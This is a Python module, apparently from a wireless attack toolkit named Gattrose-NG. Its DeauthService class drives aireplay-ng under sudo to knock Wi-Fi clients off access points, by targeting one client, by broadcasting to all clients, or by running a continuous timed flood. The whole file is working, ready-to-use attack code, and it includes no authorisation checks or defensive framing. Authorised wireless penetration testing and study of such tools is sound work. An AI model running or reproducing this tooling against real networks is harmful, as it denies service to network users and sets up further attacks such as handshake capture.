"""
Deauthentication Attack Service for Gattrose-NG
Forces clients to disconnect from APs using aireplay-ng
"""

import subprocess
import time
from typing import Optional, Callable


class DeauthService:
    """Service for executing deauth attacks"""

    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.deauth_process = None

    def deauth_client(self, ap_bssid: str, client_mac: str, count: int = 10,
                      status_callback: Callable = None) -> dict:
        """
        Deauth specific client from AP
        Returns: {'success': bool, 'packets_sent': int, 'error': str}
        """
        if self.running:
            return {'success': False, 'error': 'Deauth already in progress'}

        self.running = True

        print(f"[DEAUTH] Deauthing client {client_mac} from {ap_bssid} ({count} packets)")

        try:
            cmd = [
                'sudo', 'aireplay-ng',
                '--deauth', str(count),
                '-a', ap_bssid,  # AP BSSID
                '-c', client_mac,  # Client MAC
                self.interface
            ]

            if status_callback:
                status_callback(f"Sending {count} deauth packets to {client_mac}...")

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            # Parse output for success
            if result.returncode == 0 or "packets sent" in result.stdout.lower():
                packets_sent = count  # Assume all sent if successful
                print(f"[DEAUTH] ✓ Sent {packets_sent} deauth packets to {client_mac}")

                if status_callback:
                    status_callback(f"✓ Deauth complete ({packets_sent} packets)")

                return {
                    'success': True,
                    'packets_sent': packets_sent,
                    'target_client': client_mac,
                    'target_ap': ap_bssid
                }
            else:
                error = result.stderr or "Unknown error"
                print(f"[DEAUTH] Failed: {error}")
                return {'success': False, 'error': error}

        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Deauth attack timed out'}

        except Exception as e:
            print(f"[DEAUTH] Error: {e}")
            return {'success': False, 'error': str(e)}

        finally:
            self.running = False

    def deauth_all_clients(self, ap_bssid: str, count: int = 5,
                           status_callback: Callable = None) -> dict:
        """
        Deauth all clients from AP (broadcast deauth)
        Returns: {'success': bool, 'packets_sent': int, 'error': str}
        """
        if self.running:
            return {'success': False, 'error': 'Deauth already in progress'}

        self.running = True

        print(f"[DEAUTH] Deauthing ALL clients from {ap_bssid} ({count} packets)")

        try:
            cmd = [
                'sudo', 'aireplay-ng',
                '--deauth', str(count),
                '-a', ap_bssid,  # AP BSSID (no -c means broadcast)
                self.interface
            ]

            if status_callback:
                status_callback(f"Broadcasting {count} deauth packets to all clients...")

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0 or "packets sent" in result.stdout.lower():
                packets_sent = count
                print(f"[DEAUTH] ✓ Broadcast {packets_sent} deauth packets on {ap_bssid}")

                if status_callback:
                    status_callback(f"✓ Deauth complete ({packets_sent} packets)")

                return {
                    'success': True,
                    'packets_sent': packets_sent,
                    'target_ap': ap_bssid,
                    'broadcast': True
                }
            else:
                error = result.stderr or "Unknown error"
                print(f"[DEAUTH] Failed: {error}")
                return {'success': False, 'error': error}

        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Deauth attack timed out'}

        except Exception as e:
            print(f"[DEAUTH] Error: {e}")
            return {'success': False, 'error': str(e)}

        finally:
            self.running = False

    def continuous_deauth(self, ap_bssid: str, client_mac: Optional[str] = None,
                          duration: int = 60, status_callback: Callable = None) -> dict:
        """
        Continuous deauth attack for specified duration
        duration: Time to run attack in seconds
        Returns: {'success': bool, 'packets_sent': int, 'error': str}
        """
        if self.running:
            return {'success': False, 'error': 'Deauth already in progress'}

        self.running = True

        target = client_mac if client_mac else "all clients"
        print(f"[DEAUTH] Starting continuous deauth on {ap_bssid} targeting {target} for {duration}s")

        try:
            cmd = [
                'sudo', 'aireplay-ng',
                '--deauth', '0',  # 0 = continuous
                '-a', ap_bssid
            ]

            if client_mac:
                cmd.extend(['-c', client_mac])

            cmd.append(self.interface)

            if status_callback:
                status_callback(f"Starting continuous deauth for {duration}s...")

            # Start process
            self.deauth_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            # Run for specified duration
            time.sleep(duration)

            # Stop process
            self.deauth_process.terminate()
            self.deauth_process.wait(timeout=5)

            print(f"[DEAUTH] ✓ Continuous deauth completed ({duration}s)")

            if status_callback:
                status_callback(f"✓ Deauth complete ({duration}s)")

            return {
                'success': True,
                'duration': duration,
                'target_ap': ap_bssid,
                'target_client': client_mac
            }

        except Exception as e:
            print(f"[DEAUTH] Error: {e}")
            if self.deauth_process:
                self.deauth_process.kill()
            return {'success': False, 'error': str(e)}

        finally:
            self.running = False
            self.deauth_process = None

    def stop(self):
        """Stop ongoing deauth attack"""
        self.running = False
        if self.deauth_process:
            try:
                self.deauth_process.terminate()
                self.deauth_process.wait(timeout=5)
            except:
                self.deauth_process.kill()
            print("[DEAUTH] Attack stopped")
